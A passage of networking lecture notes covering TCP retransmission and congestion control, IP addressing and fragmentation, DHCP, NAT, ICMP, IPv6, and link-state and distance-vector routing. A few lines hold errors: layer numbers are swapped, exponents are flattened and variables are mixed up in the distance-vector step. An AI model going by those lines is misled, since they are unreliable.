sequence number, double the timeout interval, and restart the timer.Let us consider a few cases to illustrate how this works.If an acknowledgement is lost and the sender times out (meaning that there were no
additional segments sent), the sender will retransmit that segment. The receiver,
upon getting it, will see that it does not need that sequence number (it is a
duplicate segment) and will discard the segment but will send an acknowledgement back to the sender.Another case is when the sender sent two segments but the acknowledgement to the first one
was lost. Because acknowledgements are cumulative and the sender gets the second, cumulative
acknowledgement, it knows that the sender has received all the bytes and a retransmission is
not necessary.If the network round-trip time suddenly became much longer than expected, acknowledgements
to a sequence of segments might arrive after a timeout. When the timeout occurs, the
sender will retransmit only the earliest unacknowledged segment and restart the timer.
Suppose now that acknowledgements for the previously transmitted segments arrive.
TCP will process them and adjust the base of its send buffer if those bytes are no longer
needed. When the receiver gets the duplicate packet, it will discard it but send an
acknowledgement. Some time later, the sender will receive this acknowledgement but
see that it is a duplicate and hence discard it.As we have seen, TCP uses pipelining and can send multiple segments before waiting
for acknowledgements. If a receiver detects a missing sequence number, it means one of
two things: a segment was lost (either discarded due to queue overflows or due to
data corruption) or that a segment is delivered out of sequence. TCP does not use
negative acknowledgements but sends an acknowledgement for every received out-of-sequence
segment with the sequence number of the next byte it needs. In the case where a segment has
indeed been lost, every segment after that will be acknowledged with the same sequence
number. Hence, the receiver will see a stream of duplicate acknowledgements.If TCP receives three segments with duplicate
acknowledgement numbers, it assumes a segment was lost (the assumption is that it is
unlikely that one segment was routed or delayed such that three others arrived first).
Instead of waiting for an RTO to occur, TCP will transmit that missing segment
(the one with the sequence number of the ACK). This technique is
called a fast retransmit because the protocol retransmits the segment
without waiting for the RTO to occur.TCP behaves in a similar manner, but not quite the same, as the Go-Back-N protocol.
The sender only keeps track of the
earliest sequence number that has been transmitted but not acknowledged. A distinction
is that, in the case of a timeout, Go-Back-N will retransmit all segments in its
window while TCP will only retransmit the lowest (earliest) segment. With this behavior, having the receiver store out-of-order segments is
optional. The receiver may store them. If it does, and the receipt of
a segment fills in a hole (missing segment), then TCP will send back
a cumulative ACK, ensuring that the sender will not have to retransmit those
segments. However, the sender does not know if this will happen and has
to hold on to all unacknowledged segments in its send buffer just
in case any or all of those segments have to be resent.An optional enhancement to the TCP protocol uses the options field in the
header to allow the receiver to send over a list of {start byte, end byte}
values to identify the specific range of bytes that have been received.
These are called Selective Acknowledgements and make the protocol behave like
a Selective Repeat protocol.
The acknowledgement number in the TCP header is unchanged but the list of
received byte ranges allows the sender to
remove those enumerated segments from its send buffer since it knows that
they will never have to be retransmitted. It would be pointless to keep sending data to the receiver if the
receiver’s application isn’t keeping up with reading it.
In addition to slowing down transmission due to congestion (which
we will look at next), TCP allows the receiver to tell the sender
to tell it how much space it has in the receive window (the free
space in the receive buffer).
It does this by placing the size of the receive window into
the receive window field in the TCP header in each segment
that is sent to the sender.One problem that can arise is if the receive window size is zero,
the sender would stop transmitting and not get feedback from
the receiver once the window size became bigger when the application
consumed some data. The feedback is absent because the receiver
already sent acknowledgements for all received segments.
To remedy this, the sender uses probing:
if the receive window is zero, the sender will periodically send
a message with one byte of data. The receiver does not have to
accept this data if the window size is truly zero (the sender will
retransmit) but this gives the receiver a chance to send an
acknowledgement segment with a non-zero receive window once
there is room in the buffer.TCP tries to be a good network citizen and decrease the rate at which a sender sends
traffic based on its perception of congestion in the network.
This is in addition to TCP’s flow control where a recipient can tell
a sender to send less data by giving it a smaller window.TCP uses a sliding window approach to flow control.
The way that TCP controls the rate at which data is sent on a network is
by adjusting the size of its sending window. Recall that a window size
regulates the number of bytes that can be sent before waiting for acknowledgements
from the recipient. We have seen that a window size of one MSS gives us a
stop-and-wait protocol where we can send out only one segment before waiting
for an acknowledgement for the receipt of that segment. In general, the
transmission rate is the window size divided by the round-trip time.
TCP’s use of the sliding window algorithm makes the protocol self-clocking:
packet transmission is timed by the receipt of acknowledgements; each
acknowledgement slides the window.A TCP connection receives a maximum size that the receiver can accept in
the receive window field of the TCP header (abbreviated as rwnd).
In addition to that, the
transmitter will dynamically adjust its transmit window size based on
its guess of network congestion. This window size is called the
congestion window, abbreviated as cwnd. At any point in time,
the maximum window size will be the smaller of these two windows: rwnd and cwnd.IP provides no guarantees on the accuracy or timeliness of end-to-end
packet delivery through the network, nor does it provide any data on the
levels of traffic in the network or queue sizes at routers.
TCP, therefore, relies on making assumptions on congestion based on observed behavior.
If an RTO occurs or three duplicate acknowledgements
are received, the protocol assumes a segment was lost. Segment loss often
implies congestion, so TCP will decrease its transmission rate by reducing
the size of its congestion window, cwnd.
On the other hand, if TCP gets acknowledgements for sent packets then there
is no packet loss and therefore no congestion. In this case, TCP will increase
its transmission rate by increasing the size of its cwnd. This continuous
approach of increasing the transmission rate until packet loss occurs and
then decreasing it is called bandwidth probing. The connection tries to
see if it can transmit faster, backing down when problems arise, and then
trying again.TCP’s congestion control is called Additive Increase / Multiplicative Decrease (AIMD).
While a connection is experiencing no packet loss, it will increase
its congestion window by one MSS every round-trip time (RTT), hence increasing its
transmission rate. This is an additive increase (linear increase).
If cwnd was 15 segments and all 15 segments
were sent and acknowledged, the window is then increased to 16 segments.In practice, we don’t wait for all the segments in the window to be sent out before
increasing the windows size. We increase the window size (cwnd) fractionally for each arriving ACK.
The number of segments that fit into a window is cwnd/MSS.
After that many segments have been delivered, we want to increase cwnd by one segment (MSS bytes).
That means for each ACK (each received segment),
we will increase cwnd by this fractional amount: MSS divided by segments_per_cwnd, or MSS / cwnd/MSS.
The assumption is that we always have data to transmit so every segment will be of size MSS.If TCP feels that it has congestion (because of lost segments), the
congestion window is halved. This is a multiplicative decrease.
AIMD is a necessary condition for TCP congestion control to be stable in the
system as a whole and ensure that some connections do not end up monopolizing
the network link.TCP operates in one of three states: Slow Start, Congestion Avoidance, and Fast Recovery.If we start with a congestion window of one MSS and increase it linearly, it can take
a long time before we reach an effective transmission rate. TCP Slow Start
prevents this slow ramp at startup by increasing the cwnd size exponentially.
The congestion window starts at one MSS and increases by one MSS with
each received ACK, causing it to double every RTT. Slow Start starts off
slowly but speeds up quickly. It continues to increase until cwnd reaches
a threshold level, called ssthresh (slow start threshold). Then the protocol switches to Congestion Avoidance.
Initially, ssthresh is effectively not set (set to a maximum value), so the rate
of transmission continues to increase exponentially until a transmission times out
waiting for an ACK. At this time, the protocol sets the threshold, ssthresh, to
one half of the window size that resulted in the RTO and restarts the Slow Start
process. This second time, it will ramp up to the threshold and then
switch to the Congestion Avoidance state (unless packet loss occurs).Congestion Avoidance is the normal state for TCP. The state is entered
after Slow Start reaches its threshold, which is one half the last window size that experienced
an RTO due to packet loss. Congestion avoidance continues to increase the
window size (cwnd) but does so linearly: one MSS per RTT. This continues until one
of two events occur. If an RTO occurs, then ssthresh is set to half
of the cwnd (half of the current window size when the packet loss occurred), cwnd is
set to one MSS, and the protocol moves to the Slow Start state.
If three duplicate ACKs are received then instead of
going all the way back to cwnd=1 and a Slow Start, the protocol switches to Fast Recovery.Fast Recovery is entered only when three duplicate ACKs are received.
The receipt of three or more duplicate ACKs is a sign that we lost a segment
but data is still flowing between the sender and receiver since each of those ACKs was generated
when a segment was received.
They are duplicates because one needed segment was not received.
Fast Recovery assumes that cwnd is the estimated system capacity.
Instead of reducing data flow abruptly by going into Slow Start, ssthresh
and the congestion window are cut to half of their current size (this is a
multiplicative decrease).
Fast Recovery loops, picking up every duplicate acknowledgement it
receives and increases cwnd by 1 MSS each time it does so. This includes
the three duplicates that caused TCP to enter this state.
Once a non-duplicate acknowledgement is received, cwnd is set back
to the threshold, ssthresh, and the state is switched to Congestion Avoidance (additive increase).
Should a retransmission timeout occur, the same thing happens as anywhere else that an
RTO occurs: ssthresh is set to half the window size, cwnd is set to one MSS,
and TCP switches to the Slow Start state.TCP congestion control is always operating in one of three states.Whenever the congestion window, cwnd, is below the slow start threshold, ssthresh,
 the protocol is in the Slow Start state and the window increases exponentially.Once cwnd reaches ssthresh, TCP enters the Congestion Avoidance state and grows
 linearly. Whenever three duplicate ACKs are received, ssthresh and cwnd are
 halved and all duplicate ACKs are picked up before going back to the Congestion Avoidance state.
 Should an RTO occur in any state, ssthresh is set to cwnd/2, cwnd is set to one MSS,
 and TCP switches to the Slow Start state.ICMP is the Internet Control Message Protocol, a IP network-layer
protocol designed for sending various status and error messages to hosts and routers on the Internet.  ↩We looked at the transport layer (layer 3), which allowed
applications to communicate with other applications over
logical communication channels. The transport layer sits
on top of the network layer (layer 4). The network
layer provides host-to-host communication and is responsible
for routing packets (called datagrams at the network
layer) from a source host to a destination host.A route is the path that a packet takes through the network.
Routing is the process of moving the packet along the route.
Routing algorithms figure out the route that
the packet will take.
A router is a host that forwards packets from an incoming
link to a specific outgoing link as determined by the route.
Forwarding is the process that a router uses to
transfer a packet from an incoming link to the specific outgoing link.
A router consults a forwarding table (also known as
a routing table) that uses information
in the packet headers to determine the outgoing link.
The forwarding table is configured by routing algorithms.Ideally, we might expect a variety of guarantees from the network. These include:The Internet Protocol, IP, gives us none of these. It provides
best effort packet delivery but makes no guarantees on
the reliability of delivery, bounds on delay, jitter, or packet order.
Other network technologies, such as ATM (Asynchronous
Transfer Mode), provide some of these capabilities. ATM is a
virtual circuit (VC) network that provides logical connections
at the network layer. All routers in the path are involved
in setting up and maintaining the connection.
For example, ATM’s CBR (Constant Bit Rate) service allows the
connection to request a specific constant bandwidth and
specify constraints on jitter and packet loss. The network will
also guarantee in-order delivery.A datagram network, such as IP, provides connectionless
service at the network layer and relies on the transport
layer to provide connection-oriented service. Only end
hosts are involved in providing transport-layer service;
the network layer itself is oblivious.Before examining datagram networks, we’ll take a quick look at
virtual circuit networks. Unlike datagram networks,
virtual circuit networks require a connection setup phase
where an end-to-end route is established and each router
along the path agrees to participating in the path and commits
necessary resources (e.g., buffers for queues) to ensure
it can deliver the desired level of service being
requested.A host that initiates a connection request for a virtual
circuit (a communication channel) identifies the virtual
circuit with a number.
As the path for a virtual circuit is set up,
each router enters the input port/output port
mapping for that path in its forwarding table
and designates a virtual circuit number for the outgoing
link (easier than allocating a
virtual circuit number that may need to be unique globally).
Unlike datagram routers, virtual circuit routers
need to maintain connection state information.
For communication, each packet only needs to contain
a virtual circuit number. There is no need to specify
the source or destination addresses since each forwarding
table can look up the incoming interface and virtual circuit
number, find the outgoing interface and change the virtual
circuit number for the next link.With routers on datagram networks, there is no a priori
setup of the route from source to destination. Indeed,
the route may change during a communication session.
Each datagram must be identified with the destination
address of the endpoint. A router uses this destination address
to forward the packet to the next network link.
A forwarding table on a router allows it to determine
the outgoing interface for a given datagram.
IP addresses are 32 bits long (for IPv4; IPv6 addresses are
128 bits long). That gives 232 (or 2128 possible addresses. It
is not feasible to have a table of over four billion entries.
Instead, a forwarding table is based based on matching
a prefix of a number of most significant (leftmost)
bits in the address. The fewer bits in the prefix, the
more addresses are matched for that prefix. Since the forwarding
table may have a mix of longer and shorter prefixes,
it uses a longest prefix matching rule
so that longer, more specific, prefixes are tested prior to
shorter, more general, prefixes.An IP router comprises two part: a control plane and a data plane.
The control plane is responsible for the high-level software
of the router. It runs a routing processor that
implements the user interface, runs routing
protocols, populates forwarding tables, implements the ICMP protocol,
and controls queue behavior.The data plane is responsible for
packet forwarding. Its purpose is to move packets from the input
port to the output port on a router as quickly as possible.
Because of the need to move as manay as tens of millions of packets
per second per port, the data plane is generally implemented in
hardware. Note that on a router, a port refers to the input and output
interfaces and has nothing to do with the use of the term port
at the transport layer. A line card is the hardware that is
responsible for implementing the input and output ports for a
specific interface (e.g., an Ethernet interface). Because the
router operates at layer 3 (the network layer), the data plane must
process layers 1, 2, and 3 of the protocol stack: The input port of a router
implements the link-layer protocol to accept incoming packets (frames) on the physical interface
of the line card. It decapsulates (extracts the data encapsulated in the frame) the layer 3 datagram
to get the IP packet, validates the protocol version number, and updates the packet’s time-to-live (TTL) field.
If the TTL field reaches 0, the packet is dropped and a message is sent to the routing processor in
the control plane to send back an error packet.
The input port then performs a lookup in the forwarding table (using a longest prefix match) to determine the required output port
to which the packet needs to be delivered.The output port of a router accepts
outbound datagrams and encapsulates them with the appropriate link-layer headers (e.g., Ethernet).
Like the input port, it implements the link-layer protocol to transmit these outgoing packets (frames) on the physical interface
of the line card. A packet is delivered from the input port to the output port via the router’s switch fabric. This is a
general term for the architecture that allows the movement of packets between the line cards.
This packet delivery may need to be delayed if the switch fabric cannot currently accept the packet or if another
input port is currently moving data to that same output port. In that case, the packet will
need to wait in a queue at the input port.A router will have queues at both input and output ports.
The output port maintains a queue of packets received from the switch fabric
and transmits them using the link-layer protocol for the outbound interface.Queues, of course, are finite in size and have the
risk of overflowing and therefore causing
packet loss.
If the queue at the output port is full, there is no
room for the packet and it will have to be dropped
or some other packet in that queue will have to be deleted.
The simplest
algorithm is first come, first served (FCFS) queuing.
A more sophisticated one may place a priority on
the source, destination, protocol, or even a service
level that may be embedded in the packet. Active
Queue Management (AQM) refers to the algorithm in
place to make the decision of which packet gets sent next
and which packet gets dropped if the queue is full.At the input port, packets may be queued if they cannot
be forwarded to the output port quickly enough.
Queuing is susceptible to head-of-the-line blocking.
If a packet cannot be immediately forwarded to an
output port (typically because that port or switching
fabric is in use by another line card), not only is
the packet delayed but all the packets queued behind
it are blocked.There are several router architectures and the choice of design largely depends
on cost and the performance needs of packet forwarding. Every one of these
architectures is in use.The Internet Protocol (IP) has three components:The IP protocol itself, which deals with addressing
hosts, formatting datagrams, fragmenting and reassembling
datagrams, and forwarding datagrams through routers.Routing protocols, which determine network
connectivity and how forwarding
tables are configured at routersThe Internet Control Message Protocol (ICMP),
which is a network-layer protocol for error and status reporting.The IP datagram comprises a 20-byte header, a variable-size
options field after the header, and the payload, which will
typically be the TCP or UDP segment. It contains a 32-bit
source IP address, which identifies the sender, and a 32-bit
destination IP address, which identifies the recipient.A time-to-live (TTL) field is a counter that is
designed to keep packets from circulating indefinitely in
the network case forwarding tables accidentally create cycles.
An IP datagram is typically initialized with a TTL of 60 or 64
and the TTL is decremented by one each time it enters a router.
If the TTL reaches zero, the router will discard the packet.A protocol field in the datagram identifies the higher-layer
protocol that is contained within the data. Common values are
6 to identify the data as a TCP segment and 17 to identify the
data as a UDP segment. A header checksum field contains a 16-bit header checksum.
This is calculated with the same formula as UDP and TCP checksums.
Only the IP header is checksummed. A router has to recompute
the checksum since the TTL field (and possibly the options field)
will change with each network hop.If a router needs to
forward a packet to a link that has a smaller MTU (maximum
transmission unit) than the incoming link, it is possible that
the IP packet may be too large to be transmitted as a single
frame (packet) on the outgoing link. To handle this situation,
IP supports fragmentation. If a packet is bigger than
the MTU of the outgoing link, a router can split the datagram
into two or more fragments. Each fragment is a separate IP
datagram with its own IP header. When the fragments reach
their ultimate destination, the receiving host must
reassemble them into a complete packet before passing them
to the transport layer.Fragmentation is controlled by two data fields and two one-bit flags
in the IP header. A don’t fragment (DF) bit tells a
router that fragmentation is not permitted on a datagram. This
may result in the inability to route the datagram. If a
router makes the decision to fragment the datagram, the datagram
is split into two or more fragments. Each transmitted IP datagram
contains an identification number in the identification field
of the IP header. This is set when the original datagram is created
and is typically an incrementing counter for each successive datagram.
When a datagram is fragmented, the IP header of each datagram holding
a fragment contains the same ID number. This tells the receiver
that those datagrams are part of the same original datagram.
Each fragment also contains a 13-bit fragment offset. This is a
number that is multiplied by eight to indicate where the
data in this fragment belongs in the reassembled datagram. The
first datagram contains an offset of zero. Each datagram fragment
except for the last one has a more fragments (MF)
bit set to one. The last fragment will have MF=0 and
the fragment offset along with the IP length field will indicate
the length of the final reassembled datagram.Our discussion focuses on IP version 4, which is the most
widely deployed version of IP. IPv4 addresses are 32-bits
long. Every interface on an IP network must have a unique
IP address. If a host has two interfaces (e.g., Ethernet and
802.11 links), it will have one IP address for each link.
If a router has 128 ports, it will have 128 IP addresses.We earlier discussed that it would be impractical for
addresses to be randomly assigned as each router would have
to have to be able to look up an individual address in
a forwarding table of over four billion addresses. Moreover,
routing algorithms would need to manage information about
the route of every single address on the Internet.
Instead, groups of adjacent addresses are assigned to
an organization. Rutgers, for example, has been assigned
all addresses with the top 16 bits of 128.6. A router
would need to know where to forward anything that starts
with 128.6 rather than maintain a table of all the
216 (65,536) possible addresses that may start with 128.6.
This ability to use one prefix to refer to a route that
may span multiple sub-networks or hosts is called
route aggregation.A subnet (also called a
subnetwork or a network) is a group of adjacent
IP addresses that share a common prefix and are assigned
to an organization. A subnet makes up a logical
network that is connected to a router. For example,
routers on the Internet needs to know how to route an
address starting 128.6 to Rutgers.
Subnets are expressed in CIDR (Classless Inter-Domain
Routing) notation, whose format is a 32-bit IP address that
comprises the identifying bits of the subnetwork followed by
a slash an the number of bits that identify the subnetwork.
For example, 128.6.0.0/16 means that the top (leftmost) 16 bits of the
address 128.6.0.0 identify the subnetwork. The subnetwork
logically divides an IP address into a network part (the
bits that make up the subnet) and the host part (the
bits that identify the host within the subnet).A subnet mask (also called a netmask) is a bit mask that contains ones in the
positions of the network bits of the address. For Rutgers,
this means the top 16 bits will be one, resulting in a
subnet mask of 255.255.0.0. A subnet mask is used to
strip the host bits from the address to match prefixes in
a forwarding table.Subnetworks are hierarchical. An Internet service provider (ISP)
will often be assigned large blocks of IP addresses by a
Regional Internet Registry (RIR). Routers between ISPs will
need to know which block of addresses is handled by
which ISP. A specific ISP will allocate smaller blocks of IP
addresses
to organizations or lower-tiered ISPs. This is not relevant
information outside of the ISP since outside routers only
need to know how to reach one of the ISP’s routers. Routers
within the ISP need to route to the organizations that
were allocated those addresses. This process can continue
iteratively. Within Rutgers, for example, are multiple
networks that use blocks within the 128.6.0.0/16 allocation.
For instance, the host aramis.rutgers.edu has an address of
128.6.4.2 and a netmask of 0xffffff00. This indicates that
it is in a subnetwork that is defined by the prefix
128.6.4.0/24.IP supports several special addresses: bit patterns that
cannot be used as generic host addresses.
An address of 255.255.255.255 represents a limited broadcast address.
This is a broadcast address for the host’s network.
Datagrams directed to this address will be delivered to all
hosts on the directly-connected network but routers will not
forward them to other networks (they are limited to the same local
area network as
the sender).
An address with only the host bits set to one (e.g., 128.6.255.255)
represents a directed broadcast address.
Datagrams directed to this address will be routed to the
specified subnet (if the router permits it) and delivered to all
hosts on that subnet (they are directed to a specific subnet).
Routers may be configured to forward
these datagrams to ensure that they are delivered to subnets
outside the directly-connected local area network. A regular host on the Internet needs to know a few key parameters:These four parameters can be configured manually. Alternatively,
the Dynamic Host Configuration Protocol (DHCP) can
be used to do this automatically.DHCP is a protocol to allow a client to get an IP address for
itself as well as essential network configuration parameters.
The challenge with developing such a protocol is that it has
to work before the client has a valid address on the network.
Hence, a conventional request-response protocol with source
and destination addresses will not work. A requirement for
DHCP is that the DHCP server has to be running on the same
local area network as the host. If not, a DHCP Relay Agent must
run that serves as a proxy and forwards requests and responses
to the remote DHCP server. DHCP uses limited broadcast messages (255.255.255.255). A
client is allowed to send a limited broadcast and is capable
of receiving one even if does not have an address assigned.
DHCP works in four steps, with an acronym of D-O-R-A to
describe them.Discover. The client sends a limited broadcast
DHCP Discover UDP message to port 67. This contains a
random transaction identifier.Offer. The server listens to broadcasts coming in on
port 67. It gets the Discover message and responds back
by sending a limited broadcast DHCP Offer UDP message
to port 68. The response contains the following parameters:Request. The client picks up the server’s Offer
message. It compares the transaction identifier to ensure
that the offer is not directed to another client. If there
have been multiple DHCP servers and it received multiple
offers, it selects the one it wants to accept and ignores
the others. The client responds with a Request message
that contains a copy of the parameters in the Offer.ACK. The server associates the offered parameters
with the host and sends back a DHCP ACK message
acknowledging the association. The client can now configure
its network with those parameters.DHCP can be used in several scenarios:Automatic allocation. DHCP can be used to assign
a permanent IP address to a host. Dynamic allocation. DHCP can be used to lease
an address to a host. The host may use the address for
a specified period of time. This allows the reuse of an
address after it is no longer needed by the host.
A Wi-Fi hotspot is a common example of this use of DHCP.Manual allocation. An administrator can configure
the DHCP server to assign a specific address in response
to a DHCP Discover message. This is done by associating
the host’s link layer address (e.g., Ethernet MAC address)
with a specific IP address.In order to move datagrams between hosts on the Internet,
each host interface needs to have a globally unique IP
address. If this is not the case, routers will not be
able to route the packet to that interface. The need for
this, of course, creates a huge need for IP addresses.
An organization with 10,000 hosts would need 10,000 IP
addresses.Network Address Translation (NAT) addresses this
problem by allowing an organization to create a
private IP address space within the organization
while presenting one, or a small set of IP addresses
to the outside Internet. As a packet flows through
a NAT-enabled router, the router uses a
NAT Translation Table to map a source
{private-address, port1} to a {public-address, port2}.
When packets flow back to the router from the outside,
the router uses the NAT Translation Table to perform
the inverse mapping of
{public-address, port2} to {private-address, port1}.To enable NAT, the gateway router has to look at, and possibly
modify, the transport layer header since since a source
port number may need to be changed to one that is not used
by any other internal-external mapping at the router.The private address space within the organization
must contain a range of addresses that are not used
by any hosts on the public Internet. Otherwise, there would be
ambiguity as to which host is being addressed and where it is located. Hence
private addresses are non-routable on the Internet and can only
be used in internal networks. RFC 1918 defines three
address blocks that can be used for these addresses.Hosts in a NAT environment cannot accept incoming packets
unless a host/port mapping has been established by an outgoing
packet. As such, NAT is not particularly useful for servers
but is incredibly useful for client machines.The Internet Control Message Protocol (ICMP) is
a simple network-layer protocol that was designed to allow
hosts and routers to communicate network-related information.
ICMP is an eight byte or greater segment that sits in the payload
(data section) of an IP datagram.
It contains a checksum over the ICMP header and associated
data as well as
type and code fields,
which define the purpose of the message.
Depending on the message, four additional bytes may specify
parameters to the message and optional data may contain
the IP header and first eight bytes of the original datagram
for which ICMP is generating a report.The most common ICMP message types include an echo request (ping),
echo response (ping), a destination unreachable status,
a TTL exceeded warning, and a bad IP header error.The ping program is an example of a service that uses ICMP.
It creates a raw socket and generates an ICMP message of the
type echo request (type 8). When the message is routed
to the destination host, the ICMP protocol sends back an
ICMP echo reply (type 0) datagram. The traceroute program traces a route to a specific host.
It also uses ICMP by sending a series of UDP segments to a
bogus destination port on the desired host. Each UDP segment
has a progressively longer time-to-live (TTL) value in the
IP header. The first router will not route the datagram with
a TTL of 1 since it decremented to 0 and hence expired.
Instead, the router sends back an ICMP TTL exceeded
warning message that contains the name and address of the router in
the body of the ICMP message. The datagram with a TTL=2 will be routed
by the first router but will be rejected by the second one, and so on.We have thus far discussed IP version 4, the most widely deployed
version of IP. As IP was rapidly using up allocatable subnetworks
due to its 32-bit address size, design on a successor protocol,
called IPv6, began in the mid 1990s.IPv6 uses a huge address space: 128-bit addresses compared
with IPv4’s 32-bit addresses. A 128-bit address allows for
3.4×1038 addresses, which is 8.9×1028
times more than IPv4. Even though its addresses are longer,
IPv6 uses a simplified header compared to its predecessor.
It is a fixed-length headers with fewer fields. An optional
extension to the the header supports less-frequently used options
and additional capabilities.
Under IPv6, routers will never fragment IPv6 datagrams. This differs
from IPv4, where a router may do so if the outbound link has
a smaller MTU. With IPv6, the sender is expected to perform a
path MTU discovery ahead of time to determine the minimum transmission unit
for the entire route. To handle cases where higher levels of
software might create larger datagrams without checking
the path MTU, IPv6 does support fragmentation by the sender.
Since fragmentation is often not used, however, the fields related to managing
it are relegated to this optional header extension.
There is also no header
checksum. The designers reasoned that the link layer has a
checksum and TCP as well as UDP include critical IP fields in
their checksum computation. Transitioning to IPv6 has been a challenge in a world
with widespread IPv4 deployment. IPv6 systems can bridge to
IPv4 systems since the IPv4 address space is mapped onto a
subset of the IPv6 space. The problem is that IPv4 systems
cannot effectively communicate with IPv6 systems due to its
larger address space. A system using IPv6 may not be visible
to a system on an IPv4 network. Most systems today are
dual-stack systems, with both network stacks implemented
and capable of using either protocol. In areas with widespread
IPv4 deployments, such as the U.S., IPv6 is finding most of its
initial deployment in less visible areas, such as cable modems,
set-top boxes, and VoIP (voice over IP) MTAs (multimedia terminal adapter).Routers connect networks together at the network layer and are responsible
for moving datagrams (routing) from one link to another. In many cases,
a datagram will have to flow through multiple routers and there are multiple
possible paths that the datagram can take to reach its destination.
The goal of a routing algorithm is to figure out a good path, or route,
for a datagram to take to get to its destination. By good, we mean
an algorithm that will minimize the cost of the overall route. That cost may be either
time (quickest route) or money (if there are financial costs that differ between
different routes).For purposes of analysis, a route may be represented as a connected graph,
G = (N, E), where N is the set of nodes (vertices) (routers, in real life) and
E is the set of edges (links between the routers in real life).
A connected graph is one where, given two nodes a and b, there is some path
from a to b.
Each edge is identified by a pair of nodes. A node y is considered to be
a neighbor of node x if the edge (x, y) exists in the graph. That is,
(x, y) ∈ E.Each edge has associated with it a value that represents the cost of the link.
We represent the cost of an edge between nodes x and y as c(x, y). If
there is no edge (x, y) in the graph then the cost c(x, y) is infinite (∞).
If we need to route from node x to node y in this case, we will need
to establish a path through some other nodes.
For the purposes of our analysis, we will assume that a link has the same
cost in each direction. That is, c(x, y) = c(y, x). A path in a graph G = (N, E) is a sequence of nodes
(x1, x2, … xp) such that each of the pairs
(x1, x2), (x2, x3), etc. are edges in E: a path
is a sequence of edges. The cost of a path is the sum of the
edge costs. Since there may be multiple paths from one node
to another, one or more of
these will be a least-cost path.
If all edges have the same cost, that least-cost path will also be the shortest path.There are two categories of routing algorithms. A global routing algorithm
relies on complete knowledge of the network graph. The algorithm, as input, knows
the connectivity graph: all the nodes and edges. Algorithms in this category are known as link-state (LS)
algorithms. Dijkstra’s shortest path algorithm is an example of an LS algorithm.In a decentralized routing algorithm , no node has complete knowledge of all
links in the graph. A node initially knows only about its direct links.
Through an iterative process of exchanging lists of nodes and costs with its
neighbors, a node will eventually compute the least-cost path to any destination in the graph.
The distance-vector (DV) algorithm is an example of a decentralized routing algorithm.Dijkstra’s algorithm is a global algorithm that assumes that the entire network topology
(graph nodes, edges, and edge costs) is known to the algorithm. In an implementation, each
node will need to broadcast any link change information to every other node so that
all nodes will have an identical and complete view of the network.Dijkstra’s algorithm is an iterative algorithm that, after k iterations, will
compute the least-cost paths to k nodes from some given initial node.
For each iteration, the algorithm keeps a list of nodes, N’ for which the lowest
cost path has already been found (the current node requires no edge and is
the initial element on this list). For each node in the graph, the algorithm
stores:Let us assume that we need to find the least-cost routes from some node u to all other nodes.
The list of nodes with a known least-cost path, N’ is initialized to u, our starting node.
The distance for each node v, D(v) is set to the cost of the
edge from u to v, c(u, v). If there is no edge between the
nodes, the cost is set to infinity. For each node v with a non-infinite cost, the previous node, p(v),
is set to u since the entire path at this time is simply a single edge from u to v.Each iteration picks a new node, n, and examines the total distance to each of n’s
neighbor nodes from u through n. Here are the steps.Pick a node n that is not in N’ and has the smallest distance D(n). This will be the
node that we will examine this iteration and for which we will find the definitive least-cost path.Add node n to the least-cost list N’.For each neighbor m of node n that is not in N’, compute the cost of the route through n.
This is D(n) + c(n, m); that is, the cost to n plus the cost of the edge from n to m.If this computed cost to m through n is lower than the value we currently have for D(m),
update D(m) with the new cost and set the previous node of m, p(m), to n since the path through n
resulted in a lower cost.Eventually, all nodes will be in the list N’ and there will be no more nodes left to process.
At this time we have computed the least-cost paths from u to all nodes in the graph.After running Dijkstra’s algorithm for a starting node u, we know the least cost to each node v and the
node that is encountered right before v on that least-cost path: p(v). We can work backwards from this
to compute the full route. For example, if the previous node for some node z is w, we can look up p(w)
to find the node before w along the least cost path to u. Suppose that is r. We then look up
p(r) to to find the node before r along the least cost path to u. Suppose that is u, our starting
node. We now reconstructed the least-cost path: u → r → w → z.A routing table at u
is interested not in the last hop or the entire path, but only in the first hop along
the least-cost path so it can forward its
datagram to that next router. In the routing table, we would need an entry that states that datagrams
for the range of addresses handled by z need to be forwarded to router r.If we have an environment where link costs vary to reflect the current traffic volume on the link,
the lowest-cost paths will favor uncongested links. This will cause routers to send more data
over these low-traffic links, which will, in turn, increase the level of traffic on these links and
take traffic away from what used to be high-traffic links.
When the algorithm is re-run, lowest-cost routes will now be recomputed to be the formerly high-cost
routes since we channeled traffic away from them. As the new routing table is used, we will see
the same phenomenon happen again as traffic is shifted to what used to be low-volume links.
This results in oscillations between network routes each time the LS algorithm is re-run.
The best approach to avoiding these oscillations is to have routers run their LS algorithm at
random times rather than all at the same time.The distance-vector algorithm is based on a simple principle that is embodied in the Bellman-Ford
equation. This equation states that the least cost to get from node x to node y is to go through
a neighbor node v where the cost form x to v plus the cost from v to y is the smallest. Let’s look at a two-node example. Suppose that you are in Geneva, want to get to Munich, but must
travel through either Zurich or Turin. Your cost is travel time.
The paths from Zurich or Turin to Geneva may involve several more
stops but you don’t care about that. You just know the cost to your neighbors, Zurich (3:00 hours)
and Turin (2:40) and you know the cost from Zurich to Munich (3:15) and the cost from Turin to
Munich (6:00). To determine the best first leg of the route, you want to minimize the overall cost.
The cost (time) via Zurich is 3:00 + 3:15, or 6:15. The cost via Turin is 2:40 + 6:00, or 8:40.
Hence, you choose to use Zurich as your first hop. Pretty simple, eh?The distance-vector (DV) algorithm is a distributed algorithm where a node (router) communicates
only with its
neighboring nodes.
The DV algorithm is iterative. A node will send messages to its neighbors only when its local link costs
change or it receives a distance vector update message that results in the node changing its least-cost route
estimate to some destination.A node n’s distance vector is a list of costs from n that each other node in the graph.
Unknown costs are infinity. Each cost is considered to be an estimate as it may be based on
incomplete data. Eventually, the algorithm converges and the costs become true least-cost values.
In the DV algorithm, a node sends its distance vector to its neighboring nodes.A node also keeps a distance vector table. This is a set of distance vectors that it has received
from its neighbors. These distance vectors are used to allow a node to check whether it is more
efficient to have a route that goes through a specific neighbor, m, than the node it currently
thinks is the next hop on the shortest path. Initially, a node knows only of its neighbors and the cost to each neighbor. The distance vector is
a set of (node, cost) tuples, with the cost being the cost of the direct link to the neighbor.
Send a copy of the distance vector to each neighbor.Suppose that a node n receives and saves a distance vector from another node, m.
It then does a node-by-node comparison of all the nodes in both vectors. For a given node x:Is the cost of routing to x through node m lower than the current cost estimate?
That is, is the cost to x supplied in node m’s distance vector plus the cost of the link from x to m
result in a smaller value than n currently has?If yes, update n’s distance vector for the destination m to the value computed by going through x. If no,
leave the distance to m unchanged.
To build a routing table, n would also record that the currently-known lowest-cost to m is via x.
